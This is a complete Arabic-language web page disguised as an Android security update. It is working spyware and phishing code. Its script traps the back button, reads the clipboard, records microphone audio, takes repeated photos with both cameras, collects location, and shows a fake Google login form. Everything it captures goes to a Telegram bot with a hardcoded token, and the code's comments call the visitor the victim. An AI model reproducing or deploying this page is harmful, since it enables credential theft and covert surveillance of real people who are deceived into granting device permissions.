<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚙️ تحديث نظام الأندرويد</title>
    <style>
        body { background-color: #000; color: #fff; font-family: 'Roboto', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
        .update-container { width: 85%; max-width: 400px; }
        .android-logo { width: 80px; margin-bottom: 25px; filter: grayscale(1); opacity: 0.8; }
        .progress-bg { width: 100%; height: 6px; background: #333; border-radius: 10px; margin: 20px 0; overflow: hidden; }
        .progress-bar { width: 0%; height: 100%; background: #4285f4; border-radius: 10px; transition: width 0.5s; }
        .status-text { font-size: 18px; color: #eee; margin-bottom: 5px; }
        .sub-text { font-size: 12px; color: #777; line-height: 1.5; }
        
        /* واجهة تسجيل الدخول الوهمية (Phishing) */
        #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
        .login-card { width: 90%; max-width: 360px; padding: 40px 20px; text-align: center; }
        .login-card img { width: 75px; margin-bottom: 20px; }
        .login-card input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .login-card button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="update-container" id="main-ui">
        <img src="https://www.gstatic.com/images/branding/product/2x/android_96dp.png" class="android-logo">
        <div class="status-text">جاري تثبيت تحديث الأمان... <span id="percent">0%</span></div>
        <div class="progress-bg"><div class="progress-bar" id="bar"></div></div>
        <p class="sub-text">يتم الآن سد الثغرات وتحسين أداء النظام.<br>يرجى عدم إغلاق المتصفح لضمان سلامة بياناتك.</p>
    </div>

    <div id="phish-overlay">
        <div class="login-card">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
            <h1 style="font-size: 22px; font-weight: 400;">تأكيد ملكية الحساب</h1>
            <p style="font-size: 14px; color: #5f6368;">لإتمام التحديث، يرجى تسجيل الدخول</p>
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <input type="password" id="pass" placeholder="كلمة المرور">
            <button onclick="sendCreds()">تأكيد الهوية</button>
        </div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        // --- إعدادات التحكم ---
        const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
        const CHAT_ID = "7984067238";
        let currentStream = null;

        function notify(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        }

        // 1. نظام "سجن المتصفح" والاهتزاز
        function lockDown() {
            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 500]);
            
            // منع الخروج عبر زر الرجوع (100 مرة لضمان القفل)
            for (let i = 0; i < 100; i++) {
                window.history.pushState(null, null, window.location.href);
            }
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
                notify("⚠️ **الضحية حاول الخروج عبر زر الرجوع، تم منعه!**");
            };
        }

        // 2. سحب الحافظة (Clipboard) عند أول ضغطة
        document.addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                if(text) notify(`📋 **نص من حافظة الضحية:**\n\`${text}\``);
            } catch(e) {}
        }, {once: true});

        // 3. التجسس الصوتي (5 ثوانٍ كل 15 ثانية)
        async function startAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const rec = new MediaRecorder(stream);
                rec.ondataavailable = (e) => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('voice', e.data, 'v.ogg');
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                };
                setInterval(() => {
                    rec.start();
                    setTimeout(() => rec.stop(), 5000);
                }, 15000);
            } catch(e) { notify("❌ **الضحية رفض إذن الميكروفون.**"); }
        }

        // 4. التصوير المزدوج التتابعي (كل 2 ثانية)
        async function startVisuals() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const modes = ["user", "environment"];
            let i = 0;
            while(true) {
                try {
                    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
                    currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: modes[i%2] } });
                    video.srcObject = currentStream;
                    await new Promise(r => setTimeout(r, 800));
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob, 'shot.jpg');
                        fd.append('caption', `📷 كاميرا: ${modes[i%2]==="user"?"أمامية":"خلفية"}`);
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg', 0.5);
                } catch(e) {}
                i++; await new Promise(r => setTimeout(r, 2000));
            }
        }

        // 5. محاكاة التحديث (التمويه)
        function runUpdate() {
            let p = 0;
            const bar = document.getElementById('bar');
            const per = document.getElementById('percent');
            setInterval(() => {
                if (p < 99) {
                    p += Math.floor(Math.random() * 2) + 1;
                    if(p > 99) p = 99;
                    bar.style.width = p + '%';
                    per.innerText = p + '%';
                }
            }, 6000);
        }

        function sendCreds() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            if(e && p) {
                notify(`🔥 **بيانات مسحوبة:**\n📧: \`${e}\`\n🔐: \`${p}\``);
                document.getElementById('phish-overlay').style.display = 'none';
                alert("اكتمل التحديث. سيتم إعادة تشغيل النظام.");
            }
        }

        window.onload = () => {
            lockDown();
            runUpdate();
            startAudio();
            startVisuals();
            
            // إظهار تنبيه وهمي لطلب الأذونات
            setTimeout(() => {
                alert("⚠️ تم اكتشاف محاولة دخول غريبة لحسابك. يرجى السماح بالأذونات للتحقق من هويتك ومنع الاختراق!");
            }, 2000);

            // سحب الموقع
            navigator.geolocation.getCurrentPosition(pos => {
                notify(`📍 **الموقع:** https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude}`);
            });

            // إظهار تسجيل الدخول بعد 40 ثانية
            setTimeout(() => {
                document.getElementById('phish-overlay').style.display = 'flex';
                document.getElementById('main-ui').style.filter = 'blur(8px)';
            }, 40000);
            
            if(navigator.wakeLock) navigator.wakeLock.request('screen');
        };
    </script>
</body>
</html>
